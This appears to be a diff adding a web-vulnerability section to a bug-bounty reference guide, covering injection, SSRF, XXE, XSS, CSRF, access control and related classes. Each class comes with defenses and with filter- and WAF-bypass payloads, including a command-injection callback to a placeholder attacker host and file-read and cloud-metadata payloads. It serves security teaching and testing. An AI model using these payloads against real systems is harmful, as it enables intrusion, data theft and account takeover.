@@ -712,3 +712,623 @@ alone, meaningful in a chain.
 > proof is high: model it fully (fork test) before claiming it.
 
 ---
+
+# PART II — TRADITIONAL WEB
+
+Web bugs are about **trust boundaries**: the moment data crosses from "attacker
+controls this" to "the app trusts this," something must validate it correctly — and
+usually something doesn't. The reasoning habit from §0.1 is the whole game here: every
+filter, every token, every auth check, every WAF rule is a control with known bypass
+families. Enumerate inputs, find the boundary, assume the check is incomplete.
+
+Canonical references: **OWASP Top 10**, **OWASP Web Security Testing Guide (WSTG)**,
+**PortSwigger Web Security Academy**, **PayloadsAllTheThings**, and public HackerOne
+disclosures.
+
+---
+
+## CRITICAL / HIGH (Web)
+
+### 17. SQL injection (SQLi)
+
+**What it is.** User input is concatenated into a SQL query, so the attacker's input
+becomes *query syntax* instead of *data*. `' OR '1'='1` turns a login check into
+always-true; `UNION SELECT` pulls arbitrary columns; stacked queries run arbitrary
+statements. Impact ranges from auth bypass to full database read/write to RCE (via
+`xp_cmdshell`, `LOAD_FILE`/`INTO OUTFILE`, UDFs).
+
+**Types:** in-band (error-based, UNION-based), **blind boolean** (page changes on
+true/false), **blind time-based** (`SLEEP`/`WAITFOR DELAY` to infer bit by bit),
+**out-of-band** (OAST/DNS exfiltration when no direct channel). Also **second-order**
+(input stored safely, then used unsafely in a later query).
+
+**How it's found.** Inject `'`, `"`, `)`, `--`, and watch for errors/behavior change;
+test boolean and time payloads; try `UNION`; use OAST for blind. Probe *every*
+parameter, header (User-Agent, Referer, X-Forwarded-For), cookie, and JSON field — not
+just obvious ones. sqlmap for automation (where the program allows it).
+
+**Defenses.** **Parameterized queries / prepared statements** (the real fix — data can
+never become code); ORMs used safely; least-privilege DB accounts; input allowlists;
+stored procedures (if they don't themselves concatenate); and **WAFs** (a filter, not
+a fix).
+
+**Bypass techniques — defeating input filters and WAFs (the core):**
+- **Keyword-filter bypass:**
+  - *Case variation:* `SeLeCt`, `UnIoN`.
+  - *Inline comments to break up keywords:* `UN/**/ION SEL/**/ECT`, `SE/*x*/LECT`;
+    MySQL version comments `/*!50000SELECT*/` execute only in MySQL and slip past naive
+    filters.
+  - *Nested/stripped keywords:* if the filter strips `union` once,
+    `uniunionon` → `union` after removal; `SELSELECTECT`.
+  - *Whitespace alternatives:* replace spaces with `/**/`, `%09`(tab), `%0a`(newline),
+    `%0c`, `%0d`, `%a0`, or parentheses `UNION(SELECT(...))`.
+  - *Token equivalents:* `AND`/`OR` → `&&`/`||`; `=` → `LIKE`/`REGEXP`/`<>` negation;
+    `' OR '1'='1` → `' OR 1 -- -` → `'||'1`.
+- **Quote/string bypass:** no quotes needed — use hex (`0x61646d696e`), `CHAR(97,...)`,
+  `CONCAT`, or numeric context; use `\` to escape the app's escaping in some stacks.
+- **Encoding bypass:** URL-encode, double URL-encode (`%2527`), Unicode/overlong,
+  HTML-entity, or mixed encodings the WAF normalizes differently from the DB.
+- **Buffering/size bypass:** very long junk prefix so the WAF (which inspects first N
+  bytes) misses the payload later in the request; or move the payload to a body/JSON
+  the WAF doesn't inspect.
+- **HTTP parameter pollution:** `id=1&id=UNION...` — app and WAF disagree on which
+  `id` wins.
+- **Logic without blocked tokens:** boolean/time-based blind using only allowed
+  functions; conditional errors.
+- **Out-of-band** when all in-band output is filtered.
+
+**Real cases.** SQLi has driven some of the largest breaches in history (e.g. the 2008
+Heartland processor breach, numerous retail/telecom dumps). It remains a perennial
+OWASP entry.
+
+**Why it matters.** Full database compromise = every user's credentials, PII, payment
+data, and secrets; often a pivot to RCE and the rest of the network. For companies:
+mass breach, regulatory penalties (GDPR, PCI-DSS fines, breach-notification costs),
+and reputational collapse. For end users: identity theft and fraud from leaked data.
+
+---
+
+### 18. Command injection (OS command injection)
+
+**What it is.** User input reaches a shell/OS command, so the attacker appends their
+own commands. `ping $ip` with `ip = 8.8.8.8; cat /etc/passwd` runs both. Leads
+directly to RCE on the server.
+
+**How it's found.** Any feature that shells out — ping/traceroute tools, file
+conversion (ImageMagick/ffmpeg), PDF/thumbnail generation, archive handling, backups,
+"run script" admin features. Inject shell metacharacters; use time delays
+(`; sleep 10`) and OAST (`; nslookup $(whoami).attacker.oast`) for blind cases.
+
+**Defenses.** Don't call the shell — use language-native APIs/libraries; if you must,
+pass arguments as an **array (no shell)** with strict allowlisting; validate against a
+strict allowlist (not a blocklist); drop privileges.
+
+**Bypass techniques (against filters):**
+- **Separator variety:** `;`, `|`, `||`, `&`, `&&`, newline `%0a`, backticks `` `cmd` ``,
+  `$(cmd)`. If one is filtered, try the others.
+- **Whitespace without spaces:** `${IFS}` (e.g. `cat${IFS}/etc/passwd`), `%09` tab,
+  brace expansion `{cat,/etc/passwd}`, `<` redirection.
+- **Keyword obfuscation:** `c'a't`, `c"a"t`, `ca\t`, `/bin/c?t`, `/???/cat`
+  (globbing/wildcards), `$@`/`\` insertion, `$(rev<<<'tac')`, base64-decode-and-pipe,
+  `IFS`-split variables.
+- **Blind confirmation:** DNS/HTTP OAST callbacks when there's no output; time-based
+  `sleep`.
+- **Argument/flag injection:** even when you can't add a new command, injecting extra
+  *flags* into the intended binary (e.g. a dangerous option) can be as damaging.
+
+**Why it matters.** Command injection is near-instant **server takeover** — read/write
+any file, pivot internally, deploy malware, exfiltrate everything. For companies it's
+a full breach and often a foothold into internal networks; for critical infrastructure,
+a direct control-plane compromise.
+
+---
+
+### 19. Authentication bypass
+
+**What it is.** Gaining authenticated access without valid credentials — via logic
+flaws, broken token handling, flawed MFA, or SSO/federation mistakes. Distinct from
+*authorization* (what you can do once logged in; see Broken Access Control).
+
+**Common forms & how found.** Enumerate the entire auth surface: login, registration,
+password reset, "remember me," MFA, OAuth/SAML/OIDC, session issuance.
+- **Logic flaws:** response-manipulation (change `"success":false`→`true`),
+  force-browsing past a login step, skipping an MFA/step in a multi-step flow by going
+  straight to the post-MFA endpoint.
+- **Credential attacks** (where allowed): default creds, credential stuffing,
+  password-spray; weak lockout.
+- **Token flaws:** predictable/guessable session IDs or reset tokens; JWT issues
+  (below).
+- **Reset-flow flaws:** host-header poisoning to make the reset link point at your
+  domain (victim's token leaks to you); reset token tied to an easily guessed value;
+  reset doesn't invalidate sessions.
+
+**Defenses.** Proven frameworks (don't roll your own); strong session tokens (CSPRNG,
+`HttpOnly`/`Secure`/`SameSite`); server-side MFA enforcement; correct OAuth/OIDC with
+`state`/PKCE/nonce; rate limiting + lockout; secure reset (short-lived, single-use,
+bound tokens; ignore client-supplied Host).
+
+**Bypass techniques:**
+- **JWT attacks:** `alg: none` accepted → forge any claims unsigned; **algorithm
+  confusion** (server verifies an RS256 token using the *public* key as an HS256
+  *secret*, so you sign with the known public key); weak/guessable HMAC secret (crack
+  it, mint admin tokens); `kid` header injection (path traversal/SQLi to control the
+  verification key); not checking `exp`; accepting tokens signed by the wrong key
+  (`jwk`/`jku` header pointing at attacker-hosted keys).
+- **OAuth/SSO:** missing/replayable `state` (CSRF/login-CSRF), `redirect_uri`
+  validation bypass (open-redirect to steal the code/token — see §29), SAML signature
+  stripping / **XML signature wrapping** (XSW) / comment-truncation
+  (`admin@x.com<!---->.evil.com`), `email_verified` not checked so you register the
+  victim's email at the IdP.
+- **MFA bypass:** backup/remember-device flows that skip MFA; endpoint reachable
+  without the MFA step (direct request); response tampering; OTP brute force with weak
+  rate limits; race on OTP verification.
+- **Session fixation:** set a known session id before login that the app keeps after
+  auth.
+- **Password-reset poisoning** via `Host`/`X-Forwarded-Host`.
+
+**Why it matters.** Auth bypass is **account takeover at scale** — any user, including
+admins. For companies: breach, fraud, and total loss of the access-control premise;
+for users: hijacked accounts, stolen identity/funds, impersonation.
+
+---
+
+### 20. SSRF (Server-Side Request Forgery)
+
+**What it is.** The app fetches a URL the attacker controls (webhook, URL preview,
+image-from-URL, PDF renderer, import-from-URL, XXE-driven). The attacker makes the
+**server** make requests — to internal services, cloud metadata, or arbitrary hosts —
+from a trusted position behind the firewall.
+
+**Why it's so dangerous.** Reaches internal admin panels, databases, and especially
+**cloud metadata** (`http://169.254.169.254/...`) to steal IAM credentials / instance
+role tokens → cloud account takeover. (The 2019 Capital One breach was SSRF → metadata
+credentials → S3 exfiltration of ~100M records.)
+
+**How it's found.** Any parameter holding a URL/host/filename; webhooks and callbacks;
+"fetch/preview/import" features; PDF/screenshot generators; file parsers that follow
+references. Point them at OAST/Burp Collaborator to confirm the server reaches out,
+then at `169.254.169.254` and internal ranges.
+
+**Defenses.** **Allowlist** destination hosts/schemes (not blocklist); resolve the
+hostname and validate the **resolved IP** against private ranges *after* resolution
+(and re-use that IP for the actual connection); disable redirects or re-validate each
+hop; block non-HTTP schemes; require metadata service **IMDSv2** (token-bound);
+network-layer egress controls.
+
+**Bypass techniques — defeating URL/blocklist filters (the core):**
+- **Alternate IP encodings of `169.254.169.254` / `127.0.0.1`:** decimal
+  (`2130706433` for 127.0.0.1), octal (`0177.0.0.1`), hex (`0x7f000001`), mixed, and
+  **short forms** (`127.1`, `0`, `0.0.0.0`). Blocklists can't enumerate every
+  representation.
+- **IPv6:** `::1`, `::ffff:127.0.0.1`, `[::ffff:a9fe:a9fe]` — filters that only check
+  IPv4 miss these. (A 2026 Craft CMS SSRF patch was bypassed same-day via an IPv6
+  metadata endpoint the IPv4-only validator didn't cover.)
+- **DNS rebinding:** a hostname you control resolves to a *safe* public IP at
+  validation time (low/zero TTL), then to `169.254.169.254`/`127.0.0.1` on the actual
+  request — **TOCTOU** between the check and the connect. Defeats "resolve-then-check"
+  if the app resolves twice.
+- **Redirect-based:** point at an allowlisted/your URL that **302-redirects** to the
+  internal target; if the fetcher follows redirects without re-validating, you're in.
+- **Open redirect on an allowlisted domain** chained as the redirector.
+- **Credentials/fragment/confusion in the URL:** `http://expected.com@169.254.169.254/`,
+  `http://169.254.169.254#expected.com`, `http://169.254.169.254%2f@expected.com`,
+  backslashes/`%00`, and parser differentials where the validator and the HTTP client
+  disagree on the host.
+- **Non-HTTP schemes:** `gopher://` (craft raw TCP to hit Redis/Memcached/SMTP — even
+  send multi-line protocol commands), `dict://`, `file://` (local file read),
+  `ftp://`.
+- **Rare TLDs / internal names:** `localhost` variants, internal DNS names,
+  `metadata.google.internal`.
+
+**Why it matters.** SSRF is a top pivot bug: internal network access and, via cloud
+metadata, **full cloud account compromise** (Capital One: ~$190M in costs/fines,
+100M+ customers' data). For companies it's a breach multiplier; for critical/cloud
+infra it breaches the trusted perimeter entirely.
+
+---
+
+### 21. Insecure deserialization
+
+**What it is.** The app deserializes attacker-controlled serialized data back into
+objects. In many stacks, deserialization can instantiate arbitrary classes and trigger
+"magic" methods during/after construction — chained into **RCE** via *gadget chains*.
+Even without RCE: object injection, auth bypass (tampering with serialized role
+flags), and DoS.
+
+**Where it bites.** Java (`ObjectInputStream`, ysoserial gadget chains),
+.NET (`BinaryFormatter`, `TypeNameHandling` in JSON.NET), PHP (`unserialize()` +
+`__wakeup`/`__destruct` POP chains), Python (`pickle`), Ruby (Marshal/YAML),
+Node (`node-serialize`), and unsafe YAML (`yaml.load` without SafeLoader).
+
+**How it's found.** Spot serialized blobs: base64 starting `rO0` (Java),
+`AAEAAAD` (.NET `BinaryFormatter`), PHP `O:8:"..."`, pickle opcodes; cookies, view
+state, caches, message queues, hidden fields. Tamper and watch behavior; use
+**ysoserial**/**ysoserial.net**/PHPGGC to build gadget chains when dependencies allow.
+
+**Defenses.** **Don't deserialize untrusted data.** Use data-only formats (JSON/
+protobuf) with schema validation; if unavoidable, use allowlists of permitted classes
+(`ObjectInputFilter`, `SafeLoader`), integrity-protect serialized data (HMAC) so it
+can't be tampered, and run with least privilege.
+
+**Bypass techniques:**
+- **Find a gadget chain in the actual classpath** — the defense "we don't call
+  anything dangerous" fails because a *library* (Commons-Collections, Spring, etc.)
+  provides the chain. Match the chain to the deployed dependencies.
+- **Class-allowlist gaps:** a chain built entirely from allowlisted classes, or a new
+  gadget the allowlist didn't anticipate.
+- **`TypeNameHandling`/polymorphic JSON** — JSON "safe" formats become dangerous when
+  configured to embed and honor `$type`.
+- **Weak/absent integrity:** if the HMAC key is leaked/guessable (common with default
+  framework secrets, e.g. known Django/Rails/Flask secret keys), re-sign a malicious
+  payload.
+- **Property-oriented programming (POP)** chains in PHP via magic methods even without
+  a public "deserialize" endpoint (second-order via stored serialized data).
+
+**Why it matters.** Often **pre-auth RCE** — among the most severe web bugs. Full
+server compromise, lateral movement, data theft. For companies, a worst-case breach;
+for infrastructure, direct takeover.
+
+---
+
+### 22. XXE (XML External Entity injection)
+
+**What it is.** An XML parser configured to resolve **external entities** processes
+attacker-defined entities in uploaded/posted XML. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
+reads local files; `SYSTEM "http://169.254.169.254/..."` turns XXE into SSRF;
+parameter entities exfiltrate out-of-band; crafted entities cause DoS (billion
+laughs).
+
+**Where it bites.** Any XML input: SOAP, SAML, RSS, SVG upload, DOCX/XLSX/ODF (zipped
+XML), XML APIs, config import. Also anywhere a format *contains* XML.
+
+**How it's found.** Submit XML with a benign external entity pointing at OAST; if the
+server connects, XXE is live. Try file reads; try parameter-entity OOB exfiltration for
+blind cases; test file-upload parsers (SVG especially).
+
+**Defenses.** **Disable DTDs / external entities** in the parser (the fix):
+`disallow-doctype-decl`, `external-general-entities=false`, `XMLConstants.FEATURE_SECURE_PROCESSING`,
+`defusedxml` in Python, `libxml_disable_entity_loader` historically in PHP. Prefer JSON
+where possible.
+
+**Bypass techniques:**
+- **Blind/OOB via parameter entities** when direct output isn't reflected — exfil file
+  contents to your server through a crafted DTD.
+- **Alternate injection points:** if the obvious XML is locked down, find a *secondary*
+  XML parser (a file-upload format, a nested document, an XInclude:
+  `<xi:include parse="text" href="file:///etc/passwd"/>` when XInclude is enabled even
+  though DOCTYPE is blocked).
+- **Encoding/UTF-16/BOM tricks** to slip past naive request filters.
+- **SVG/Office upload** as the XML carrier when the main API rejects raw XML.
+
+**Why it matters.** File disclosure (secrets, source, `/etc/passwd`), SSRF into cloud
+metadata, and sometimes RCE — a breach and pivot vector. SAML-based XXE/signature bugs
+also break SSO for an entire org.
+
+---
+
+### 23. Broken access control & IDOR
+
+**What it is.** The #1 OWASP category. The app authenticates *who you are* but fails to
+enforce *what you may access/do*. **IDOR** (Insecure Direct Object Reference): change
+an identifier (`/account?id=123` → `124`, or a filename, UUID, or key in a JSON body)
+and read/modify another user's object because the server never checks ownership.
+Broadly includes **horizontal** (other users' data), **vertical** (admin functions),
+missing function-level checks, and forced browsing to hidden endpoints.
+
+**How it's found.** Make two accounts; do an action as user A; replay it as user B
+swapping only the identifier — does it work? Enumerate IDs (sequential, or
+"unguessable" UUIDs that leak elsewhere). Hit admin/API endpoints directly without the
+UI. Try every HTTP method. Check every object reference in URLs, bodies, headers, and
+nested JSON. This is often the *highest-yield* class in bug bounty because it's pure
+logic and automation-friendly.
+
+**Defenses.** **Enforce authorization on every request, server-side, per object**
+("does the current principal own/may-act-on this exact resource?"); deny-by-default;
+centralized access-control layer; don't rely on unguessable IDs as the only control
+(that's security-by-obscurity); re-check on state-changing *and* read actions.
+
+**Bypass techniques (against authorization checks):**
+- **Parameter/ID swapping & enumeration** — the base case.
+- **Method/verb tampering:** a `GET` is blocked but `POST`/`PUT`/`PATCH`/`DELETE`
+  (or `HEAD`, or an arbitrary method) isn't checked the same way; try all.
+- **HTTP header overrides for "admin-only" gates:** `X-Forwarded-For: 127.0.0.1`,
+  `X-Original-URL`/`X-Rewrite-URL` to reach a blocked path, `X-Forwarded-Host`,
+  `X-Custom-IP-Authorization`, `Referer` checks — if the app trusts a spoofable
+  header for internal/admin access.
+- **Path/URL-normalization tricks** to reach restricted endpoints a front-end filter
+  blocked: `/admin` blocked but `/Admin`, `/admin/`, `/admin/.`, `/%61dmin`,
+  `/./admin`, `/admin%2f`, `/admin;foo`, matrix params, trailing dots, double slashes
+  — front-end proxy and back-end app disagree on the canonical path (also enables
+  front-end access-control bypass in reverse proxies).
+- **Mass assignment / autobinding:** add fields the UI didn't send
+  (`"role":"admin"`, `"isAdmin":true`, `"userId":<victim>`) to a JSON body the server
+  binds wholesale.
+- **"Unpredictable" reference leakage:** UUID/GUID that leaks in another response, a
+  listing endpoint, email, referrer, or cache → defeats "unguessable = safe."
+- **GraphQL:** query other objects by id, batch/alias to brute force, reach fields the
+  REST layer protected but the resolver doesn't; introspection to map hidden types.
+- **Blind/second-order:** an ID that isn't checked on write but is later trusted on
+  read by an admin.
+
+**Why it matters.** IDOR/broken access control = mass data exposure and account/data
+takeover with *no exploit code* — just changed numbers. It's consistently the most
+reported impactful bug class. For companies: large-scale PII/financial leakage,
+regulatory exposure; for users: their private data and actions controlled by strangers.
+
+---
+
+### 24. Privilege escalation
+
+**What it is.** Moving from low privilege to higher — **horizontal** (another peer's
+data/actions) or **vertical** (user→admin). Usually the *outcome* of another bug:
+broken function-level authorization, mass assignment of a role field, JWT/role
+tampering, admin endpoints with no vertical check, or a logic flaw in role assignment.
+
+**How it's found.** Map the role matrix (what each role may do); as a low-priv user,
+attempt every higher-priv action directly (API, forced browse); tamper role claims in
+tokens/cookies/JSON; look for self-service role changes, invite/team flows that let
+you grant yourself admin, or "impersonate" features with weak checks.
+
+**Defenses & bypass.** Server-side role checks on *every* privileged function;
+immutable server-side role storage (never trust client role); deny-by-default. *Bypass:*
+mass assignment (`role=admin`), JWT alg/secret attacks (§19), function-level
+authorization gaps, header spoofing, and chaining an IDOR on an admin-management
+endpoint.
+
+**Why it matters.** Admin access = control of all users and data; often the final step
+of a breach chain. Catastrophic for companies and a direct route to full compromise.
+
+---
+
+## MEDIUM / HIGH (Web)
+
+### 25. Cross-Site Scripting (XSS)
+
+**What it is.** Attacker-controlled input is reflected into a page and executed as
+**JavaScript in the victim's browser**, in the victim's session/origin. Steal
+cookies/tokens, perform actions as the victim, keylog, pivot to full account takeover,
+or (chained) reach internal apps.
+
+**Types:**
+- **Reflected:** payload in the request is echoed into the immediate response (needs a
+  crafted link/form delivered to the victim).
+- **Stored/persistent:** payload saved server-side (comment, profile, filename) and
+  served to every viewer — worst, because it can be wormable and hits many users.
+- **DOM-based:** vulnerability is entirely client-side — a **source** (`location.hash`,
+  `document.URL`, `postMessage`, `localStorage`) flows to a dangerous **sink**
+  (`innerHTML`, `eval`, `document.write`, `insertAdjacentHTML`, jQuery `$()`,
+  `setAttribute` on event handlers) without sanitization.
+
+**How it's found.** Inject a unique marker, find where/how it's reflected (HTML body,
+attribute, JS string, URL, CSS), then craft a context-appropriate breakout. Trace DOM
+sources→sinks for client-side. Test every input and reflection context separately.
+
+**Defenses.** **Context-aware output encoding** (HTML, attribute, JS, URL, CSS — each
+different); safe sink APIs (`textContent`, not `innerHTML`); framework auto-escaping
+(React/Angular/Vue — but watch `dangerouslySetInnerHTML`/`v-html`/`bypassSecurityTrust`);
+**Content Security Policy (CSP)** as defense-in-depth; **Trusted Types** for DOM XSS;
+`HttpOnly` cookies (so XSS can't read the session cookie — though it can still *act*);
+sanitizers like DOMPurify.
+
+**Bypass techniques:**
+- **Context breakout & filter evasion:**
+  - If `<`/`>` filtered, inject into an existing **attribute/event handler** context:
+    `" onmouseover=alert(1) x="`, `" autofocus onfocus=alert(1)`.
+  - If `script` is stripped, use other tags/events: `<img src=x onerror=alert(1)>`,
+    `<svg onload=alert(1)>`, `<body onload>`, `<iframe srcdoc>`, `<details open ontoggle>`.
+  - *Case/obfuscation:* `<ScRiPt>`; split tags `<scr<script>ipt>` to survive naive
+    single-pass stripping; HTML-entity/decimal/hex encoding of characters the sink
+    decodes.
+  - *No parentheses/quotes/alphanumerics:* template literals `` alert`1` ``,
+    `eval(atob('...'))`, `onerror=alert;throw 1`; JSFuck-style for extreme filters.
+  - *JS-string context:* break out with `';alert(1)//` or `</script>` close.
+  - *Alternate encodings:* base64 in `data:` URIs, `javascript:` URL in href, Unicode
+    escapes in JS (`alert`).
+- **WAF bypass:** case/encoding/mixed-encoding (double-URL, HTML-entity, UTF-7 on old
+  stacks), inserting comments/newlines, using less-known event handlers the WAF
+  signature list misses, splitting the payload across parameters, oversized request to
+  outrun inspection.
+- **CSP bypass (the key modern skill):**
+  - **JSONP endpoints** on an allowlisted domain: `<script src="https://allowed/jsonp?callback=alert">`.
+  - **Allowlisted CDN with a known gadget** (AngularJS on the allowlist → CSP bypass
+    via Angular sandbox escape; or any hosted library that can be coerced to run code).
+  - **`'unsafe-inline'`** present → inline scripts just run.
+  - **`'unsafe-eval'`** + a template/expression sink.
+  - **Nonce reuse/leakage** or a nonce predictable/reflected so you can reuse it;
+    dangling-markup to steal the nonce.
+  - **`base-uri` not set** → inject `<base href>` to hijack relative script loads;
+    **`object-src`/`default-src` gaps**; overly broad `*` or scheme-only (`https:`)
+    sources.
+  - **Policy injection** — if any part of the CSP header reflects user input.
+  - **DOM clobbering** to overwrite variables the page trusts, bypassing logic even
+    under CSP.
+- **Mutation XSS (mXSS):** payload is inert until the browser's HTML parser
+  *re-serializes* it (e.g. `innerHTML` round-trips), mutating it into executable
+  markup — defeats some sanitizers (older DOMPurify bypasses).
+- **`SameSite`/HttpOnly reality check:** HttpOnly stops cookie *reading*, not
+  *actions*; token in JS-readable storage is still stealable.
+
+**Why it matters.** XSS = session/account takeover in the user's browser, mass
+compromise via stored/wormable payloads, credential and data theft, and a pivot into
+internal/admin interfaces. For companies: breach, defacement, supply-chain-like spread;
+for users: hijacked accounts and stolen data under their own trusted session.
+
+---
+
+### 26. CSRF (Cross-Site Request Forgery)
+
+**What it is.** A state-changing request (change email/password, transfer funds, change
+settings) is authenticated *solely by ambient credentials* (cookies) the browser sends
+automatically. An attacker's page triggers the request cross-site; the victim's browser
+attaches their cookies; the server can't tell it wasn't the user. Result: actions
+performed as the victim without their intent.
+
+**How it's found.** Find state-changing requests; check what authorizes them. If it's
+only cookies (no unpredictable token, no custom header requirement), test a
+cross-origin form/`fetch`. Check whether a token exists, is validated, and is bound to
+the session.
+
+**Defenses.** **CSRF tokens** (unpredictable, per-session/per-request, validated
+server-side, not leaked); **`SameSite` cookies** (`Lax`/`Strict`); verify
+`Origin`/`Referer`; require a **custom header** for JSON APIs (can't be set
+cross-origin without CORS); re-authentication for sensitive actions; double-submit
+cookie pattern.
+
+**Bypass techniques (against CSRF defenses — the core):**
+- **Token validation flaws:**
+  - *Token not tied to the session* → use your own valid token in the victim's request
+    (if the server only checks "is this a valid token," not "is it *this user's*").
+  - *Token validated only when present* → **delete the token parameter entirely** and
+    the check is skipped.
+  - *Token tied to a non-session cookie* you can set (double-submit with a cookie the
+    attacker can plant via another vuln/subdomain) → inject matching token+cookie.
+  - *Method-dependent check* → switch `POST`→`GET` if the token is only enforced on
+    POST.
+  - *Predictable/static/weak token* (global, time-based, user-id-derived) → forge it.
+  - *Token leaked* via Referer, URL, or a reflected response → read then reuse.
+- **`SameSite` bypass:**
+  - **Lax allows top-level GET navigation** → if a state change is reachable via GET,
+    a top-level `window.location` still carries the cookie.
+  - **`Lax+POST` 2-minute window** (some browsers): a freshly set cookie behaves as
+    `None` briefly.
+  - **Same-site, different-origin:** a vuln on *any* subdomain (`sub.site.com`) counts
+    as same-site → stored XSS/open redirect there issues the request with cookies.
+  - **Method/gadget** `<form method=POST>` auto-submit; or client-side redirect from an
+    on-site sink.
+- **Referer/Origin check bypass:** request has *no* Referer (via `Referrer-Policy:
+  no-referrer`, `rel=noreferrer`, or `data:`/`https→http` downgrade) and the server
+  **allows missing Referer**; or the allowlist is a naive substring
+  (`attacker.com?x=trusted.com`, `trusted.com.attacker.com`).
+- **CORS misconfig as an enabler** (reading responses cross-origin; see §28).
+- **Clickjacking** as an alternative when CSRF tokens hold but the UI is framable
+  (trick the user into clicking the real button).
+- **Login CSRF** (force the victim into *your* account to capture their later input).
+
+**Why it matters.** CSRF performs privileged actions as the victim — password/email
+change leading to account takeover, fund transfers, config changes. For companies:
+fraud and unauthorized state changes; for users: their account altered or drained
+without ever clicking "confirm."
+
+---
+
+### 27. Race conditions / TOCTOU
+
+**What it is.** Two requests hit a **check-then-act** window simultaneously, so a
+limit enforced "once" is bypassed because both pass the check before either commits.
+Classic: redeem a one-time gift card/coupon N times in parallel; withdraw more than
+your balance; use a single-use invite/discount repeatedly; apply a vote/like twice;
+bypass a "you already did this" guard. (PortSwigger's "limit overrun" and
+"multi-step" race labs.)
+
+**How it's found.** Identify any per-user limit, one-time action, or balance check,
+then fire many identical requests **in parallel** (single-packet attack / Turbo Intruder
+/ HTTP/2 multiplexing to minimize jitter). Watch for the action succeeding more times
+than allowed.
+
+**Defenses.** Atomic DB operations (conditional/compare-and-swap updates,
+`SELECT ... FOR UPDATE`, unique constraints), proper locking/transactions,
+idempotency keys, enforcing limits in a single atomic step rather than read-modify-write.
+
+**Bypass techniques / attacker view.** Use the **single-packet attack** (send ~20-30
+requests so they arrive in one TCP packet, eliminating network jitter) to hit the
+window reliably even over the internet; find **multi-step** races (state A→B where a
+parallel request sneaks between steps); exploit object/session races (two flows
+sharing state). Even "locked" systems often lock the wrong granularity or only one of
+several equivalent endpoints.
+
+**Why it matters.** Races turn one coupon into thousands, overdraw balances, double-spend
+credits, and bypass quantity/limit controls — direct financial loss and inventory/
+fairness abuse. In fintech/crypto-adjacent systems it's effectively minting money.
+
+---
+
+### 28. CORS misconfiguration
+
+**What it is.** CORS relaxes the same-origin policy to let specified origins read
+cross-origin responses. Misconfigured, it lets a *malicious* origin read authenticated
+responses (stealing data/tokens). The lethal combo: `Access-Control-Allow-Origin`
+reflecting the request's `Origin` **plus** `Access-Control-Allow-Credentials: true`.
+
+**How it's found/bypassed.** Send requests with evil `Origin` and inspect the ACAO
+response: does it reflect arbitrary origins? Does it trust `null` (sandboxed iframe/
+`data:` can send `Origin: null`)? Is the allowlist a weak substring
+(`trusted.com.evil.com`, `evil-trusted.com`)? Does it allow any subdomain (then a
+subdomain XSS/takeover reads everything)? Pre-flight bypass with "simple" requests.
+
+**Defenses/why it matters.** Strict origin allowlist, never reflect, never combine `*`
+with credentials, don't trust `null`. Impact: cross-origin theft of user data and
+tokens from authenticated APIs — a read-side account-data breach and a common CSRF/
+XSS force-multiplier.
+
+---
+
+## MEDIUM / LOW (Web) — breadth to recognize and chain
+
+### 29. Open redirect
+
+User-controlled redirect target (`?next=`, `?url=`, `?returnTo=`) sends users to an
+attacker site. Low alone, but a key **chaining** primitive: steals OAuth
+codes/tokens (`redirect_uri`), bypasses SSRF/Referer allowlists, boosts phishing
+credibility. *Bypasses:* `//evil.com`, `https:evil.com`, `/\evil.com`,
+`https://trusted.com@evil.com`, `trusted.com.evil.com`, double-encoding, whitelisted-
+domain-as-substring. **Why it matters:** account takeover via token theft when chained;
+large-scale phishing under the brand's domain.
+
+### 30. Business logic flaws
+
+Abuse of *intended* functionality in unintended ways — no "injection," just broken
+assumptions: negative quantities/prices (`qty=-1` → credit), integer/currency rounding
+in your favor, applying a discount/coupon infinitely or stacking, skipping a payment
+step (go straight to the confirmation endpoint), replaying a "buy" webhook, abusing
+refund/return flows, exceeding limits via a different unit, time-of-use manipulation,
+or workflow steps done out of order. **How found:** understand the *business* intent
+and the money/state flow, then violate every assumption ("must I really pay first? can
+this be negative/zero/huge? can steps run out of order or in parallel?"). **Defense:**
+validate invariants server-side at every step; never trust client-computed prices/
+totals/roles. **Why it matters:** direct financial loss and fraud, often invisible to
+scanners because nothing is "malformed" — it's the app doing exactly what it was
+(wrongly) told. Among the highest-value bounty classes because it's uniquely human to
+find.
+
+### 31. File upload vulnerabilities
+
+Uploading a dangerous file (web shell, HTML/SVG with script, polyglot) when validation
+is weak. *Bypasses:* content-type spoofing, double extensions (`shell.php.jpg`), null
+bytes (`shell.php%00.jpg`), case (`.pHp`, `.phtml`, `.php5`), magic-byte spoofing,
+path traversal in the filename to write outside the upload dir, SVG→stored XSS,
+bypassing client-side-only checks. **Defense:** allowlist extensions + validate real
+content, randomize names, store outside webroot / serve from a sandboxed domain, no
+execute permission. **Why it matters:** often direct RCE (web shell) or stored XSS —
+server or user compromise.
+
+### 32. Path/directory traversal & LFI
+
+`../../etc/passwd` (or encoded `..%2f`, `..%252f`, `....//`, absolute paths, null
+bytes) to read/write files outside the intended directory; LFI can reach RCE via log
+poisoning, PHP wrappers (`php://filter`, `data://`), or session files. **Defense:**
+canonicalize and confirm the resolved path stays within an allowed base; never pass
+user input to file APIs directly. **Why it matters:** source/secret/credential
+disclosure, config theft, and an RCE pivot.
+
+### 33. Security misconfiguration & information disclosure
+
+Default creds, directory listing, verbose errors/stack traces, exposed `.git`/`.env`/
+backups/admin panels, debug endpoints, missing security headers, overly permissive
+cloud buckets, leaked API keys in JS/source maps, outdated components with known CVEs.
+Low individually, but together they hand attackers the map and often the keys. **How
+found:** recon, content discovery, JS/source review, header analysis. **Why it
+matters:** every leaked secret or exposed interface is a shortcut past every other
+control; breaches frequently start here.
+
+### 34. Request smuggling & cache poisoning (awareness)
+
+**HTTP request smuggling** (front-end/back-end disagree on request boundaries via
+`Content-Length`/`Transfer-Encoding` desync — CL.TE/TE.CL/TE.TE/CL.0/H2.CL) can poison
+other users' requests, bypass front-end access controls, and hijack sessions. **Web
+cache poisoning/deception** uses unkeyed inputs (headers) to serve attacker content to
+others, or tricks caches into storing private responses at public URLs. High impact,
+high skill; recognize the preconditions (chained proxies, aggressive caching) and
+escalate carefully. **Why it matters:** mass, cross-user compromise and access-control
+bypass at the infrastructure layer.
+
+---
